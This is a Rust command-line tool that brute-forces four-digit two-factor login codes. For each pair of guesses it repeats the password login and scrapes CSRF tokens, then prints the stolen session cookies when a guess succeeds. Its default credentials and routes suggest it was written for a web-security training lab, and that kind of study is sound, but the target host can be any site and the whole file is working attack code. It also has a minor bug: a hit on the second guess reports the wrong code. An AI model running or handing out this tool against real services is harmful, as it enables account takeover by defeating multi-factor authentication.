use clap::Parser;
use rand::{self, RngExt};
use reqwest::{Client, ClientBuilder, Response, StatusCode, cookie::Jar, redirect::Policy};
use std::sync::Arc;
use thiserror;
use url::Url;

const LOGIN_ROUTE: &str = "login";
const MFA_ROUTE: &str = "login2";

#[derive(Parser)]
#[command(name = "mfa-force", version, about)]
struct Cli {
    host: String,
    #[arg(short, long, default_value_t = 3)]
    retries: u16,
    #[arg(short, long, default_value_t = 2)]
    attempts: u16,
    #[arg(short, long, default_value = "carlos")]
    username: String,
    #[arg(short, long, default_value = "montoya")]
    password: String,
}

enum BodyContent {
    URLEncoded(String),
}

impl BodyContent {
    fn content_type(&self) -> String {
        match self {
            Self::URLEncoded(_) => String::from("application/x-www-form-urlencoded"),
        }
    }
}

enum RequestMethod {
    POST(BodyContent),
    GET,
}

#[derive(thiserror::Error, Debug)]
enum RequestError {
    #[error("Max retries exceeded {0}")]
    RetryLimitExceeded(u16),
    #[error("Reqwest error")]
    ReqwestError(#[from] reqwest::Error),
    #[error("CSRF token not found")]
    CSRFTokenNotFound,
    #[error("Failed to login {0} {1}: {2}")]
    LoginFailed(String, String, StatusCode),
}

enum AttemptOutcome {
    Hit(Response),
    Wrong,
    Dead,
}

struct CsrfToken(String);

async fn request_with_retry(
    client: &Client,
    url: &Url,
    method: &RequestMethod,
    max_retries: u16,
) -> Result<Response, RequestError> {
    let mut last_err: Option<reqwest::Error> = None;
    for _ in 0..max_retries {
        let result = match method {
            RequestMethod::GET => client.get(url.clone()).send().await,
            RequestMethod::POST(b) => match b {
                BodyContent::URLEncoded(s) => {
                    client
                        .post(url.clone())
                        .body(s.clone())
                        .header("Content-Type", b.content_type())
                        .send()
                        .await
                }
            },
        };
        match result {
            Ok(resp) => return Ok(resp),
            Err(e) => last_err = Some(e),
        }
    }
    Err(last_err
        .map(RequestError::ReqwestError)
        .unwrap_or(RequestError::RetryLimitExceeded(max_retries)))
}

/**
 * This runs the full login workflow and gets the session information needed to run the MFA brute force attack.
 * This will be called in a loop.
 */
async fn get_session(
    base_url: &Url,
    client: &Client,
    regex: &regex::Regex,
    username: &str,
    password: &str,
    retries: u16,
) -> Result<CsrfToken, RequestError> {
    let login_url = base_url.join(LOGIN_ROUTE).unwrap();

    let response = request_with_retry(&client, &login_url, &RequestMethod::GET, retries).await?;
    let text = response.text().await?;

    let csrf0 = regex
        .captures(&text)
        .and_then(|c| c.get(1))
        .ok_or(RequestError::CSRFTokenNotFound)?
        .as_str()
        .to_owned();

    let body = BodyContent::URLEncoded(
        format!("csrf={}&username={}&password={}", csrf0, username, password).to_string(),
    );

    let response =
        request_with_retry(&client, &login_url, &RequestMethod::POST(body), retries).await?;

    let status = response.status();

    eprintln!("POST /login -> {}", status); // must be 302, or nothing downstream works

    if status.as_u16() != 302 {
        return Err(RequestError::LoginFailed(
            username.to_owned(),
            password.to_owned(),
            status.clone(),
        ));
    }

    let mfa_url = base_url.join(MFA_ROUTE).unwrap();

    let response = request_with_retry(&client, &mfa_url, &RequestMethod::GET, retries).await?;
    let text = response.text().await?;

    let csrf1 = regex
        .captures(&text)
        .and_then(|c| c.get(1))
        .ok_or(RequestError::CSRFTokenNotFound)?
        .as_str()
        .to_owned();

    Ok(CsrfToken(csrf1))
}

async fn guess_mfa(
    client: &Client,
    url: &Url,
    csrf_token: &CsrfToken,
    guess: &String,
    retries: u16,
) -> Result<AttemptOutcome, RequestError> {
    let body =
        BodyContent::URLEncoded(format!("csrf={}&mfa-code={}", csrf_token.0, guess).to_owned());
    let response = request_with_retry(client, url, &RequestMethod::POST(body), retries).await?;

    let status = response.status();
    let loc = response
        .headers()
        .get(reqwest::header::LOCATION)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("-");
    eprintln!("POST /login2 [{}] -> {}", status, loc);

    if status.as_u16() != 302 {
        Ok(AttemptOutcome::Wrong)
    } else {
        Ok(AttemptOutcome::Hit(response))
    }
}

#[tokio::main]
async fn main() -> Result<(), RequestError> {
    let args = Cli::parse();

    println!("Starting 2FA brute-force attack");
    println!("host: {}", args.host);
    println!("retries: {}", args.retries);
    println!("attempts: {}", args.attempts);
    println!("username: {}", args.username);
    println!("password: {}", args.password);

    let client = ClientBuilder::new()
        .redirect(Policy::none())
        .cookie_provider(Arc::from(Jar::default()))
        .build()
        .unwrap();

    let base_url = Url::parse(&args.host).unwrap();
    let regex = regex::Regex::new(r#"name="csrf" value="(\w+|\d+)\""#).unwrap();

    let login2_url = base_url.join(MFA_ROUTE).unwrap();

    for i in (0..=9999).step_by(2) {
        let csrf_token = get_session(
            &base_url,
            &client,
            &regex,
            &args.username,
            &args.password,
            args.retries,
        )
        .await?;

        let code = format!("{:0>4}", i);
        let code2 = format!("{:0>4}", i + 1);

        if let Ok(s) = guess_mfa(&client, &login2_url, &csrf_token, &code, args.retries).await {
            match s {
                AttemptOutcome::Hit(r) => {
                    let cookies = r.cookies();
                    for cookie in cookies {
                        eprintln!("{}={}", cookie.name(), cookie.value());
                    }
                    eprintln!("Code {}", code);
                    break;
                }
                _ => {}
            }
        }

        if let Ok(s) = guess_mfa(&client, &login2_url, &csrf_token, &code2, args.retries).await {
            match s {
                AttemptOutcome::Hit(r) => {
                    let cookies = r.cookies();
                    for cookie in cookies {
                        eprintln!("{}={}", cookie.name(), cookie.value());
                    }
                    eprintln!("Code {}", code);
                    break;
                }
                _ => {}
            }
        }
    }

    Ok(())
}
